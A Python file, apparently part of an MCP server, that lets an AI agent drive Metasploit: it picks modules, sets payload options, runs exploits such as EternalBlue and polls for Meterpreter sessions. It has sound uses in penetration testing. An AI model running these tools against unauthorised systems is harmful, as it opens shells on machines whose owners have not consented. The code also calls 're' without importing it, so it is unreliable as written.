# -*- coding: utf-8 -*-
import asyncio
import shlex
import socket
import subprocess
import sys
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple, Union

# --- Third-party Libraries ---
import uvicorn
from fastapi import FastAPI, HTTPException, Request, Response
from mcp.server.fastmcp import FastMCP
from mcp.server.sse import SseServerTransport
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
from starlette.applications import Starlette
from starlette.routing import Mount, Route, Router

# --- Import from split modules ---
# Supports both direct execution (python metasploit.py) and package imports
try:
    from .config import (
        logger, session_shell_type,
        MSF_PASSWORD, MSF_SERVER, MSF_PORT_STR, MSF_SSL_STR, PAYLOAD_SAVE_DIR,
        DEFAULT_CONSOLE_READ_TIMEOUT, LONG_CONSOLE_READ_TIMEOUT,
        SESSION_COMMAND_TIMEOUT, SESSION_READ_INACTIVITY_TIMEOUT,
        EXPLOIT_SESSION_POLL_TIMEOUT, EXPLOIT_SESSION_POLL_INTERVAL,
        RPC_CALL_TIMEOUT, MSF_PROMPT_RE, SHELL_PROMPT_RE,
        PAYLOAD_GENERATION_TIMEOUT, EXPLOIT_EXECUTION_TIMEOUT,
        SHELL_COMMAND_DEFAULT_TIMEOUT, ATTACH_SESSION_POLL_INTERVAL,
        BUFFER_CLEAR_DELAY,
    )
    from .client import (
        initialize_msf_client, get_msf_client, check_msf_connection,
        get_persistent_console,
    )
    from .console import get_msf_console, run_command_safely
except ImportError:
    from config import (
        logger, session_shell_type,
        MSF_PASSWORD, MSF_SERVER, MSF_PORT_STR, MSF_SSL_STR, PAYLOAD_SAVE_DIR,
        DEFAULT_CONSOLE_READ_TIMEOUT, LONG_CONSOLE_READ_TIMEOUT,
        SESSION_COMMAND_TIMEOUT, SESSION_READ_INACTIVITY_TIMEOUT,
        EXPLOIT_SESSION_POLL_TIMEOUT, EXPLOIT_SESSION_POLL_INTERVAL,
        RPC_CALL_TIMEOUT, MSF_PROMPT_RE, SHELL_PROMPT_RE,
        PAYLOAD_GENERATION_TIMEOUT, EXPLOIT_EXECUTION_TIMEOUT,
        SHELL_COMMAND_DEFAULT_TIMEOUT, ATTACH_SESSION_POLL_INTERVAL,
        BUFFER_CLEAR_DELAY,
    )
    from client import (
        initialize_msf_client, get_msf_client, check_msf_connection,
        get_persistent_console,
    )
    from console import get_msf_console, run_command_safely

# --- MCP Server Initialization ---
mcp = FastMCP("Metasploit Tools Enhanced (Streamlined)")

# --- Internal Helper Functions ---

def _parse_options_gracefully(options: Union[Dict[str, Any], str, None]) -> Dict[str, Any]:
    """
    Gracefully parse options from different formats.
    
    Handles:
    - Dict format (correct): {"key": "value", "key2": "value2"}
    - String format (common mistake): "key=value,key=value"
    - None: returns empty dict
    
    Args:
        options: Options in dict format, string format, or None
        
    Returns:
        Dictionary of parsed options
        
    Raises:
        ValueError: If string format is malformed
    """
    if options is None:
        return {}
    
    if isinstance(options, dict):
        # Already correct format
        return options
    
    if isinstance(options, str):
        # Handle the common mistake format: "key=value,key=value"
        if not options.strip():
            return {}
            
        logger.info(f"Converting string format options to dict: {options}")
        parsed_options = {}
        
        try:
            # Split by comma and then by equals
            pairs = [pair.strip() for pair in options.split(',') if pair.strip()]
            for pair in pairs:
                if '=' not in pair:
                    raise ValueError(f"Invalid option format: '{pair}' (missing '=')")
                
                key, value = pair.split('=', 1)  # Split only on first '='
                key = key.strip()
                value = value.strip()
                
                # Validate key is not empty
                if not key:
                    raise ValueError(f"Invalid option format: '{pair}' (empty key)")
                
                # Remove quotes if they wrap the entire value
                if (value.startswith('"') and value.endswith('"')) or \
                   (value.startswith("'") and value.endswith("'")):
                    value = value[1:-1]
                
                # Basic type conversion
                if value.lower() in ('true', 'false'):
                    value = value.lower() == 'true'
                elif value.isdigit():
                    try:
                        value = int(value)
                    except ValueError:
                        pass  # Keep as string if conversion fails
                
                parsed_options[key] = value
            
            logger.info(f"Successfully converted string options to dict: {parsed_options}")
            return parsed_options
            
        except Exception as e:
            raise ValueError(f"Failed to parse options string '{options}': {e}. Expected format: 'key=value,key2=value2' or dict {{'key': 'value'}}")
    
    # For any other type, try to convert to dict
    try:
        return dict(options)
    except (TypeError, ValueError) as e:
        raise ValueError(f"Options must be a dictionary or comma-separated string format 'key=value,key2=value2'. Got {type(options)}: {options}")


async def _get_validated_session(client, session_id: int) -> Optional[Dict[str, Any]]:
    """
    Validate that a Metasploit session exists and return its info.

    Args:
        client: MsfRpcClient instance
        session_id: Session ID to validate

    Returns:
        Session info dict if valid, None if session not found
    """
    current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
    session_id_str = str(session_id)
    if session_id_str not in current_sessions:
        logger.error(f"Session {session_id} not found.")
        return None
    return current_sessions[session_id_str]


def _session_not_found_error(session_id: int, extra_fields: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Build a standardized error response for missing sessions.

    Args:
        session_id: The session ID that was not found
        extra_fields: Optional additional fields to include in the response

    Returns:
        Standardized error dict with status and message
    """
    result = {"status": "error", "message": f"Session {session_id} not found."}
    if extra_fields:
        result.update(extra_fields)
    return result


def _log_tool_result(tool_name: str, status: str, detail: str = "") -> None:
    """
    Log tool execution results consistently.

    Args:
        tool_name: Name of the tool being executed
        status: Result status (success, error, timeout, etc.)
        detail: Optional detail message
    """
    if status == "error":
        logger.error(f"[{tool_name}] {status}: {detail}")
    else:
        logger.info(f"[{tool_name}] {status}{': ' + detail if detail else ''}")

async def _get_module_object(module_type: str, module_name: str) -> Any:
    """Gets the MSF module object, handling potential path variations."""
    client = get_msf_client()
    base_module_name = module_name # Start assuming it's the base name
    if '/' in module_name:
        parts = module_name.split('/')
        if parts[0] in ('exploit', 'payload', 'post', 'auxiliary', 'encoder', 'nop'):
             # Looks like full path, extract base name
             base_module_name = '/'.join(parts[1:])
             if module_type != parts[0]:
                 logger.warning(f"Module type mismatch: expected '{module_type}', got path starting with '{parts[0]}'. Using provided type.")
        # Else: Assume it's like 'windows/smb/ms17_010_eternalblue' - already the base name

    logger.debug(f"Attempting to retrieve module: client.modules.use('{module_type}', '{base_module_name}')")
    try:
        module_obj = await asyncio.to_thread(lambda: client.modules.use(module_type, base_module_name))
        logger.debug(f"Successfully retrieved module object for {module_type}/{base_module_name}")
        return module_obj
    except (MsfRpcError, KeyError) as e:
        # KeyError can be raised by pymetasploit3 if module not found
        error_str = str(e).lower()
        if "unknown module" in error_str or "invalid module" in error_str or isinstance(e, KeyError):
             logger.error(f"Module {module_type}/{base_module_name} (from input {module_name}) not found.")
             raise ValueError(f"Module '{module_name}' of type '{module_type}' not found.") from e
        else:
             logger.error(f"MsfRpcError getting module {module_type}/{base_module_name}: {e}")
             raise MsfRpcError(f"Error retrieving module '{module_name}': {e}") from e

async def _set_module_options(module_obj: Any, options: Dict[str, Any]):
    """Sets options on a module object, performing basic type guessing."""
    logger.debug(f"Setting options for module {getattr(module_obj, 'fullname', '')}: {options}")
    for k, v in options.items():
        # Basic type guessing
        original_value = v
        if isinstance(v, str):
            if v.isdigit():
                try: v = int(v)
                except ValueError: pass # Keep as string if large number or non-integer
            elif v.lower() in ('true', 'false'):
                v = v.lower() == 'true'
            # Add more specific checks if needed (e.g., for file paths)
        elif isinstance(v, (int, bool)):
            pass # Already correct type
        # Add handling for other types like lists if necessary

        try:
            # Use lambda to capture current k, v for the thread
            await asyncio.to_thread(lambda key=k, value=v: module_obj.__setitem__(key, value))
            # logger.debug(f"Set option {k}={v} (original: {original_value})")
        except (MsfRpcError, KeyError, TypeError) as e:
             # Catch potential errors if option doesn't exist or type is wrong
             logger.error(f"Failed to set option {k}={v} on module: {e}")
             raise ValueError(f"Failed to set option '{k}' to '{original_value}': {e}") from e

async def _verify_and_find_session_robust(
    expected_session_id: Optional[int] = None,
    max_retries: int = 20,  # DRASTICALLY INCREASED from 5 to 20 attempts
    initial_delay: float = 10.0,  # INCREASED from 2.0 to 10.0 seconds - give MSF more time
    retry_delay: float = 5.0  # INCREASED from 1.5 to 5.0 seconds - more time between retries
) -> Optional[Dict[str, Any]]:
    """
    Robustly verify and find Meterpreter sessions with multiple retries.

    This function handles the common scenario where Metasploit creates a session
    but there's a delay before it's registered in the RPC sessions list.

    Args:
        expected_session_id: If provided, verify this specific session ID exists
        max_retries: Number of times to check for sessions
        initial_delay: Seconds to wait before first check (give MSF time to register)
        retry_delay: Seconds to wait between retry attempts

    Returns:
        Dictionary with session info if found, None otherwise.
        Format: {"session_id": int, "info": dict, "method": str}
    """
    client = get_msf_client()
    logger.info(f"[SESSION_VERIFY] Starting ROBUST session verification with EXTENDED timeouts...")
    logger.info(f"[SESSION_VERIFY] Expected ID: {expected_session_id}, Retries: {max_retries}, Initial delay: {initial_delay}s, Retry delay: {retry_delay}s")
    total_wait_time = initial_delay + (max_retries - 1) * retry_delay
    logger.info(f"[SESSION_VERIFY] Maximum total wait time: ~{total_wait_time:.0f} seconds ({total_wait_time/60:.1f} minutes)")

    # Initial delay to give Metasploit time to register the session
    logger.info(f"[SESSION_VERIFY] Waiting {initial_delay}s for MSF to register session...")
    await asyncio.sleep(initial_delay)

    for attempt in range(1, max_retries + 1):
        try:
            logger.info(f"[SESSION_VERIFY] Attempt {attempt}/{max_retries}: Querying sessions list...")
            current_sessions = await asyncio.to_thread(lambda: client.sessions.list)

            logger.info(f"[SESSION_VERIFY] Found {len(current_sessions)} total session(s) in RPC")

            # Log all current sessions for debugging
            if current_sessions:
                for sid, sinfo in current_sessions.items():
                    session_type = sinfo.get('type', 'unknown') if isinstance(sinfo, dict) else 'unknown'
                    session_info_str = sinfo.get('info', '') if isinstance(sinfo, dict) else str(sinfo)
                    session_via = sinfo.get('via_exploit', '') if isinstance(sinfo, dict) else ''
                    session_target_host = sinfo.get('target_host', '') if isinstance(sinfo, dict) else ''
                    logger.info(f"[SESSION_VERIFY]   - Session #{sid}: type={session_type}, via={session_via}, target={session_target_host}, info={session_info_str[:50]}")
            else:
                logger.warning(f"[SESSION_VERIFY] No sessions in RPC list! MSF may not have registered it yet or exploit failed.")

            # If we're looking for a specific session ID
            if expected_session_id is not None:
                session_key = str(expected_session_id)
                if session_key in current_sessions:
                    logger.info(f"[SESSION_VERIFY] ✓ SUCCESS! Session #{expected_session_id} FOUND in RPC (attempt {attempt})")
                    return {
                        "session_id": expected_session_id,
                        "info": current_sessions[session_key],
                        "method": "expected_id_match",
                        "attempts_needed": attempt
                    }
                else:
                    logger.warning(f"[SESSION_VERIFY] ✗ Session #{expected_session_id} NOT found in RPC list (attempt {attempt})")

            # If no specific ID or ID not found, try to find the MOST RECENT session
            if current_sessions:
                # Sessions are typically keyed by ID (as strings)
                # Get the highest ID (most recent)
                try:
                    session_ids = [int(sid) for sid in current_sessions.keys()]
                    latest_id = max(session_ids)
                    latest_info = current_sessions[str(latest_id)]

                    logger.info(f"[SESSION_VERIFY] ✓ Found LATEST session #{latest_id} (attempt {attempt})")
                    return {
                        "session_id": latest_id,
                        "info": latest_info,
                        "method": "latest_session",
                        "attempts_needed": attempt
                    }
                except (ValueError, KeyError) as e:
                    logger.error(f"[SESSION_VERIFY] Error parsing session IDs: {e}")

            # No sessions found, retry
            if attempt < max_retries:
                logger.info(f"[SESSION_VERIFY] No sessions found, waiting {retry_delay}s before retry...")
                await asyncio.sleep(retry_delay)

        except Exception as e:
            logger.error(f"[SESSION_VERIFY] Error during session verification (attempt {attempt}): {e}")
            if attempt < max_retries:
                await asyncio.sleep(retry_delay)

    logger.warning(f"[SESSION_VERIFY] ✗ FAILED: No sessions found after {max_retries} attempts")
    return None

async def _execute_module_rpc(
    module_type: str,
    module_name: str, # Can be full path or base name
    module_options: Dict[str, Any],
    payload_spec: Optional[Union[str, Dict[str, Any]]] = None # Payload name or {name: ..., options: ...}
) -> Dict[str, Any]:
    """
    Helper to execute an exploit, auxiliary, or post module as a background job via RPC.
    Includes polling logic for exploit sessions.
    """
    client = get_msf_client()
    module_obj = await _get_module_object(module_type, module_name) # Handles path variants
    full_module_path = getattr(module_obj, 'fullname', f"{module_type}/{module_name}") # Get canonical name

    await _set_module_options(module_obj, module_options)

    payload_obj_to_pass = None
    payload_name_for_log = None
    payload_options_for_log = None

    # Prepare payload if needed (primarily for exploits, also used by start_listener)
    if module_type == 'exploit' and payload_spec:
        if isinstance(payload_spec, str):
             payload_name_for_log = payload_spec
             # Passing name string directly is supported by exploit.execute
             payload_obj_to_pass = payload_name_for_log
             logger.info(f"Executing {full_module_path} with payload '{payload_name_for_log}' (passed as string).")
        elif isinstance(payload_spec, dict) and 'name' in payload_spec:
             payload_name = payload_spec['name']
             payload_options = payload_spec.get('options', {})
             payload_name_for_log = payload_name
             payload_options_for_log = payload_options
             try:
                 payload_obj = await _get_module_object('payload', payload_name)
                 await _set_module_options(payload_obj, payload_options)
                 payload_obj_to_pass = payload_obj # Pass the configured payload object
                 logger.info(f"Executing {full_module_path} with configured payload object for '{payload_name}'.")
             except (ValueError, MsfRpcError) as e:
                 logger.error(f"Failed to prepare payload object for '{payload_name}': {e}")
                 return {"status": "error", "message": f"Failed to prepare payload '{payload_name}': {e}"}
        else:
             logger.warning(f"Invalid payload_spec format: {payload_spec}. Expected string or dict with 'name'.")
             return {"status": "error", "message": "Invalid payload specification format."}

    logger.info(f"Executing module {full_module_path} as background job via RPC...")
    try:
        if module_type == 'exploit':
            exec_result = await asyncio.to_thread(lambda: module_obj.execute(payload=payload_obj_to_pass))
        else: # auxiliary, post
            exec_result = await asyncio.to_thread(lambda: module_obj.execute())

        logger.info(f"RPC execute() result for {full_module_path}: {exec_result}")

        # --- Process Execution Result ---
        if not isinstance(exec_result, dict):
            logger.error(f"Unexpected result type from {module_type} execution: {type(exec_result)} - {exec_result}")
            return {"status": "error", "message": f"Unexpected result from module execution: {exec_result}", "module": full_module_path}

        if exec_result.get('error', False):
            error_msg = exec_result.get('error_message', exec_result.get('error_string', 'Unknown RPC error during execution'))
            logger.error(f"Failed to start job for {full_module_path}: {error_msg}")
            # Check for common errors
            if "could not bind" in error_msg.lower():
                return {"status": "error", "message": f"Job start failed: Address/Port likely already in use. {error_msg}", "module": full_module_path}
            return {"status": "error", "message": f"Failed to start job: {error_msg}", "module": full_module_path}

        job_id = exec_result.get('job_id')
        uuid = exec_result.get('uuid')

        if job_id is None:
            logger.warning(f"{module_type.capitalize()} job executed but no job_id returned: {exec_result}")
            # Sometimes handlers don't return job_id but are running, check by UUID/name later maybe
            if module_type == 'exploit' and 'handler' in full_module_path:
                 # Check jobs list for a match based on payload/lhost/lport
                 await asyncio.sleep(1.0)
                 jobs_list = await asyncio.to_thread(lambda: client.jobs.list)
                 for jid, jinfo in jobs_list.items():
                     if isinstance(jinfo, dict) and jinfo.get('name','').endswith('Handler') and \
                        jinfo.get('datastore',{}).get('LHOST') == module_options.get('LHOST') and \
                        jinfo.get('datastore',{}).get('LPORT') == module_options.get('LPORT') and \
                        jinfo.get('datastore',{}).get('PAYLOAD') == payload_name_for_log:
                          logger.info(f"Found probable handler job {jid} matching parameters.")
                          return {"status": "success", "message": f"Listener likely started as job {jid}", "job_id": jid, "uuid": uuid, "module": full_module_path}

            return {"status": "unknown", "message": f"{module_type.capitalize()} executed, but no job ID returned.", "result": exec_result, "module": full_module_path}

        # --- Exploit Specific: Poll for Session ---
        found_session_id = None
        if module_type == 'exploit' and uuid:
             start_time = asyncio.get_running_loop().time()
             logger.info(f"Exploit job {job_id} (UUID: {uuid}) started. Polling for session (timeout: {EXPLOIT_SESSION_POLL_TIMEOUT}s)...")
             while (asyncio.get_running_loop().time() - start_time) < EXPLOIT_SESSION_POLL_TIMEOUT:
                 try:
                     sessions_list = await asyncio.to_thread(lambda: client.sessions.list)
                     for s_id, s_info in sessions_list.items():
                         # Ensure comparison is robust (uuid might be str or bytes, info dict keys too)
                         s_id_str = str(s_id)
                         if isinstance(s_info, dict) and str(s_info.get('exploit_uuid')) == str(uuid):
                             found_session_id = s_id # Keep original type from list keys
                             logger.info(f"Found matching session {found_session_id} for job {job_id} (UUID: {uuid})")
                             break # Exit inner loop

                     if found_session_id is not None: break # Exit outer loop

                     # Optional: Check if job died prematurely
                     # job_info = await asyncio.to_thread(lambda: client.jobs.info(str(job_id)))
                     # if not job_info or job_info.get('status') != 'running':
                     #     logger.warning(f"Job {job_id} stopped or disappeared during session polling.")
                     #     break

                 except MsfRpcError as poll_e: logger.warning(f"Error during session polling: {poll_e}")
                 except Exception as poll_e: logger.error(f"Unexpected error during polling: {poll_e}", exc_info=True); break

                 await asyncio.sleep(EXPLOIT_SESSION_POLL_INTERVAL)

             if found_session_id is None:
                 logger.warning(f"Polling timeout ({EXPLOIT_SESSION_POLL_TIMEOUT}s) reached for job {job_id}, no matching session found.")

        # --- Construct Final Success/Warning Message ---
        message = f"{module_type.capitalize()} module {full_module_path} started as job {job_id}."
        status = "success"
        if module_type == 'exploit':
            if found_session_id is not None:
                 message += f" Session {found_session_id} created."
            else:
                 message += " No session detected within timeout."
                 status = "warning" # Indicate job started but session didn't appear

        return {
            "status": status, "message": message, "job_id": job_id, "uuid": uuid,
            "session_id": found_session_id, # None if not found/not applicable
            "module": full_module_path, "options": module_options,
            "payload_name": payload_name_for_log, # Include payload info if exploit
            "payload_options": payload_options_for_log
        }

    except (MsfRpcError, ValueError) as e: # Catch module prep errors too
        error_str = str(e).lower()
        logger.error(f"Error executing module {full_module_path} via RPC: {e}")
        if "missing required option" in error_str or "invalid option" in error_str:
             missing = getattr(module_obj, 'missing_required', [])
             return {"status": "error", "message": f"Missing/invalid options for {full_module_path}: {e}", "missing_required": missing}
        elif "invalid payload" in error_str:
             return {"status": "error", "message": f"Invalid payload specified: {payload_name_for_log or 'None'}. {e}"}
        return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error executing module {full_module_path} via RPC")
        return {"status": "error", "message": f"Unexpected server error running {full_module_path}: {e}"}

async def _execute_module_console(
    module_type: str,
    module_name: str, # Can be full path or base name
    module_options: Dict[str, Any],
    command: str, # Typically 'exploit', 'run', or 'check'
    payload_spec: Optional[Union[str, Dict[str, Any]]] = None,
    timeout: int = LONG_CONSOLE_READ_TIMEOUT
) -> Dict[str, Any]:
    """
    Helper to execute a module synchronously via console.

    IMPORTANT: Uses persistent console for exploits to maintain session context.
    """
    # Determine full path needed for 'use' command
    if '/' not in module_name:
         full_module_path = f"{module_type}/{module_name}"
    else:
         # Assume full path or relative path was given; ensure type prefix
         if not module_name.startswith(module_type + '/'):
             # e.g., got 'windows/x', type 'exploit' -> 'exploit/windows/x'
             # e.g., got 'exploit/windows/x', type 'exploit' -> 'exploit/windows/x' (no change)
             if not any(module_name.startswith(pfx + '/') for pfx in ['exploit', 'payload', 'post', 'auxiliary', 'encoder', 'nop']):
                  full_module_path = f"{module_type}/{module_name}"
             else: # Already has a type prefix, use it as is
                   full_module_path = module_name
         else: # Starts with correct type prefix
             full_module_path = module_name

    logger.info(f"Executing {full_module_path} synchronously via console (command: {command})...")

    payload_name_for_log = None
    payload_options_for_log = None

    # Use persistent console for exploits to maintain session context
    # For other module types (aux, post), use temporary console
    if module_type == 'exploit':
        console = await get_persistent_console()
        logger.info(f"Using PERSISTENT console for exploit execution (maintains session context)")
        try:
            setup_commands = [f"use {full_module_path}"]

            # Add module options
            for key, value in module_options.items():
                val_str = str(value)
                if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                    val_str = shlex.quote(val_str)
                elif isinstance(value, bool):
                    val_str = str(value).lower() # MSF console expects lowercase bools
                setup_commands.append(f"set {key} {val_str}")

            # Add payload and payload options (if applicable)
            if payload_spec:
                payload_name = None
                payload_options = {}
                if isinstance(payload_spec, str):
                    payload_name = payload_spec
                elif isinstance(payload_spec, dict) and 'name' in payload_spec:
                    payload_name = payload_spec['name']
                    payload_options = payload_spec.get('options', {})

                if payload_name:
                    payload_name_for_log = payload_name
                    payload_options_for_log = payload_options
                    # Need base name for 'set PAYLOAD'
                    if '/' in payload_name:
                        parts = payload_name.split('/')
                        if parts[0] == 'payload': payload_base_name = '/'.join(parts[1:])
                        else: payload_base_name = payload_name # Assume relative
                    else: payload_base_name = payload_name # Assume just name

                    setup_commands.append(f"set PAYLOAD {payload_base_name}")
                    for key, value in payload_options.items():
                        val_str = str(value)
                        if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                            val_str = shlex.quote(val_str)
                        elif isinstance(value, bool):
                            val_str = str(value).lower()
                        setup_commands.append(f"set {key} {val_str}")

            # Execute setup commands
            for cmd in setup_commands:
                setup_output = await run_command_safely(console, cmd, execution_timeout=DEFAULT_CONSOLE_READ_TIMEOUT)
                # Basic error check in setup output
                if any(err in setup_output for err in ["[-] Error setting", "Invalid option", "Unknown module", "Failed to load"]):
                    error_msg = f"Error during setup command '{cmd}': {setup_output}"
                    logger.error(error_msg)
                    return {"status": "error", "message": error_msg, "module": full_module_path}
                await asyncio.sleep(0.1) # Small delay between setup commands

            # Execute the final command (exploit, run, check)
            logger.info(f"Running final console command: {command}")
            module_output = await run_command_safely(console, command, execution_timeout=timeout)
            logger.debug(f"Synchronous execution output length: {len(module_output)}")

            # --- Parse Console Output ---
            session_id = None
            session_opened_line = ""
            session_verified_info = None

            # Try multiple patterns to detect session creation
            session_patterns = [
                r"(?:meterpreter|command shell)\s+session\s+(\d+)\s+opened",  # Standard pattern
                r"session\s+(\d+)\s+opened",  # Generic pattern
                r"opened.*session\s+(\d+)",  # Alternative order
                r"session\s+(\d+)\s+created",  # Alternative wording
                r"\[.*\]\s+meterpreter\s+session\s+(\d+)",  # Bracket format
                r"sending\s+stage.*session\s+(\d+)",  # Stage + session
            ]

            for pattern in session_patterns:
                session_match = re.search(pattern, module_output, re.IGNORECASE)
                if session_match:
                    try:
                        session_id = int(session_match.group(1))
                        session_opened_line = session_match.group(0)
                        logger.info(f"[CONSOLE] Detected session #{session_id} in output: '{session_opened_line}'")
                        break
                    except (ValueError, IndexError):
                        logger.warning(f"[CONSOLE] Pattern matched but failed to parse ID: {session_match.group(0)}")

            # Use robust verification system with extended parameters
            if session_id is not None:
                # We found a session ID in output, verify it exists
                logger.info(f"[CONSOLE] Session #{session_id} detected in console, using robust verification...")
                session_verified_info = await _verify_and_find_session_robust(
                    expected_session_id=session_id,
                    max_retries=20,  # Use new default (already set in function)
                    initial_delay=10.0,
                    retry_delay=5.0
                )
            elif command in ['exploit', 'run'] and any(term in module_output.lower() for term in ['sending stage', 'transmission completed', 'eternalblue overwrite completed', 'triggering free']):
                # No session ID in output but exploit seems successful, try to find ANY session
                # CRITICAL: EternalBlue often completes exploit without showing session immediately
                logger.warning(f"[CONSOLE] No session ID found in output, but exploit SUCCESS indicators present. Searching for ANY session with extended timeout...")
                session_verified_info = await _verify_and_find_session_robust(
                    expected_session_id=None,  # Find any session
                    max_retries=20,  # Extended retries for slow sessions
                    initial_delay=15.0,  # EXTRA initial delay (15s) when no session in output
                    retry_delay=5.0
                )
                if session_verified_info:
                    session_id = session_verified_info["session_id"]
                    logger.info(f"[CONSOLE] ✓ Found session #{session_id} via fallback search after exploit success")

            # Construct response message based on verification results
            status = "success"
            message = f"{module_type.capitalize()} module {full_module_path} completed via console ({command})."

            if session_verified_info:
                session_id = session_verified_info["session_id"]
                attempts = session_verified_info.get("attempts_needed", "?")
                method = session_verified_info.get("method", "unknown")
                session_info = session_verified_info.get("info", {})
                session_type = session_info.get("type", "unknown") if isinstance(session_info, dict) else "unknown"

                message += f" ✓ Session #{session_id} VERIFIED and ready to use (found via {method}, {attempts} attempt(s), type: {session_type})."
                logger.info(f"[CONSOLE] ✓ Session #{session_id} successfully verified and available")
            elif session_id is not None:
                # Session detected in output but NOT verified via RPC
                message += f" ⚠ Session #{session_id} appeared in output but could NOT be verified in Metasploit. It may have died immediately or is not accessible."
                status = "warning"
                logger.warning(f"[CONSOLE] ⚠ Session #{session_id} not verified - may be dead or inaccessible")
            elif command in ['exploit', 'run'] and any(term in module_output.lower() for term in ['session opened', 'sending stage']):
                message += " ⚠ Exploit execution completed with session indicators, but no session could be verified. Check console output."
                status = "warning"
                logger.warning(f"[CONSOLE] ⚠ Session indicators in output but no verified session")

            # Check for common failure indicators
            if any(fail in module_output.lower() for fail in ['exploit completed, but no session was created', 'exploit failed', 'run failed', 'check failed', 'module check failed']):
                 status = "error" if status != "warning" else status # Don't override warning if session might have opened
                 message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                 logger.error(f"Failure detected in console output for {full_module_path}.")


            return {
                 "status": status,
                 "message": message,
                 "module_output": module_output,
                 "session_id_detected": session_id,
                 "session_verified": session_verified_info is not None,
                 "session_info": session_verified_info,
                 "session_opened_line": session_opened_line,
                 "module": full_module_path,
                 "options": module_options,
                 "payload_name": payload_name_for_log,
                 "payload_options": payload_options_for_log
            }

        except (RuntimeError, MsfRpcError, ValueError) as e: # Catch errors from run_command_safely or setup
            logger.error(f"Error during console execution of {full_module_path}: {e}")
            return {"status": "error", "message": f"Error executing {full_module_path} via console: {e}"}
        except Exception as e:
            logger.exception(f"Unexpected error during console execution of {full_module_path}")
            return {"status": "error", "message": f"Unexpected server error running {full_module_path} via console: {e}"}
    else:
        # Use temporary console for non-exploit modules (aux, post, etc.)
        logger.info(f"Using temporary console for {module_type} execution")
        async with get_msf_console() as console:
            try:
                setup_commands = [f"use {full_module_path}"]

                # Add module options
                for key, value in module_options.items():
                    val_str = str(value)
                    if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                        val_str = shlex.quote(val_str)
                    elif isinstance(value, bool):
                        val_str = str(value).lower()
                    setup_commands.append(f"set {key} {val_str}")

                # Add payload and payload options (if applicable)
                if payload_spec:
                    payload_name = None
                    payload_options = {}
                    if isinstance(payload_spec, str):
                        payload_name = payload_spec
                    elif isinstance(payload_spec, dict) and 'name' in payload_spec:
                        payload_name = payload_spec['name']
                        payload_options = payload_spec.get('options', {})

                    if payload_name:
                        payload_name_for_log = payload_name
                        payload_options_for_log = payload_options
                        if '/' in payload_name:
                            parts = payload_name.split('/')
                            if parts[0] == 'payload': payload_base_name = '/'.join(parts[1:])
                            else: payload_base_name = payload_name
                        else: payload_base_name = payload_name

                        setup_commands.append(f"set PAYLOAD {payload_base_name}")
                        for key, value in payload_options.items():
                            val_str = str(value)
                            if isinstance(value, str) and any(c in val_str for c in [' ', '"', "'", '\\']):
                                val_str = shlex.quote(val_str)
                            elif isinstance(value, bool):
                                val_str = str(value).lower()
                            setup_commands.append(f"set {key} {val_str}")

                # Execute setup commands
                for cmd in setup_commands:
                    setup_output = await run_command_safely(console, cmd, execution_timeout=DEFAULT_CONSOLE_READ_TIMEOUT)
                    if any(err in setup_output for err in ["[-] Error setting", "Invalid option", "Unknown module", "Failed to load"]):
                        error_msg = f"Error during setup command '{cmd}': {setup_output}"
                        logger.error(error_msg)
                        return {"status": "error", "message": error_msg, "module": full_module_path}
                    await asyncio.sleep(0.1)

                # Execute the final command
                logger.info(f"Running final console command: {command}")
                module_output = await run_command_safely(console, command, execution_timeout=timeout)
                logger.debug(f"Synchronous execution output length: {len(module_output)}")

                # Parse Console Output
                session_id = None
                session_opened_line = ""
                session_match = re.search(r"(?:meterpreter|command shell)\s+session\s+(\d+)\s+opened", module_output, re.IGNORECASE)
                if session_match:
                     try:
                         session_id = int(session_match.group(1))
                         session_opened_line = session_match.group(0)
                         logger.info(f"Detected session {session_id} opened in console output.")
                     except (ValueError, IndexError):
                         logger.warning("Found session opened pattern, but failed to parse ID.")

                status = "success"
                message = f"{module_type.capitalize()} module {full_module_path} completed via console ({command})."
                if command in ['exploit', 'run'] and session_id is None and \
                   any(term in module_output.lower() for term in ['session opened', 'sending stage']):
                     message += " Session may have opened but ID detection failed or session closed quickly."
                     status = "warning"
                elif command in ['exploit', 'run'] and session_id is not None:
                     message += f" Session {session_id} detected."

                # Check for common failure indicators
                if any(fail in module_output.lower() for fail in ['exploit completed, but no session was created', 'exploit failed', 'run failed', 'check failed', 'module check failed']):
                     status = "error" if status != "warning" else status
                     message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                     logger.error(f"Failure detected in console output for {full_module_path}.")

                return {
                     "status": status,
                     "message": message,
                     "module_output": module_output,
                     "session_id_detected": session_id,
                     "session_opened_line": session_opened_line,
                     "module": full_module_path,
                     "options": module_options,
                     "payload_name": payload_name_for_log,
                     "payload_options": payload_options_for_log
                }

            except (RuntimeError, MsfRpcError, ValueError) as e:
                logger.error(f"Error during console execution of {full_module_path}: {e}")
                return {"status": "error", "message": f"Error executing {full_module_path} via console: {e}"}
            except Exception as e:
                logger.exception(f"Unexpected error during console execution of {full_module_path}")
                return {"status": "error", "message": f"Unexpected server error running {full_module_path} via console: {e}"}

# --- MCP Tool Definitions ---

@mcp.tool()
# FUNCIÓN ANTIGUA - COMENTADA (Solo buscaba en nombres de exploits, no en metadatos)
# async def list_exploits(search_term: str = "") -> List[str]:
#     """
#     List available Metasploit exploits, optionally filtered by search term.
#
#     Args:
#         search_term: Optional term to filter exploits (case-insensitive).
#
#     Returns:
#         List of exploit names matching the term (max 200), or top 100 if no term.
#     """
#     client = get_msf_client()
#     logger.info(f"Listing exploits (search term: '{search_term or 'None'}')")
#     try:
#         # Add timeout to prevent hanging on slow/unresponsive MSF server
#         logger.debug(f"Calling client.modules.exploits with {RPC_CALL_TIMEOUT}s timeout...")
#         exploits = await asyncio.wait_for(
#             asyncio.to_thread(lambda: client.modules.exploits),
#             timeout=RPC_CALL_TIMEOUT
#         )
#         logger.debug(f"Retrieved {len(exploits)} total exploits from MSF.")
#         if search_term:
#             term_lower = search_term.lower()
#             filtered_exploits = [e for e in exploits if term_lower in e.lower()]
#             count = len(filtered_exploits)
#             limit = 200
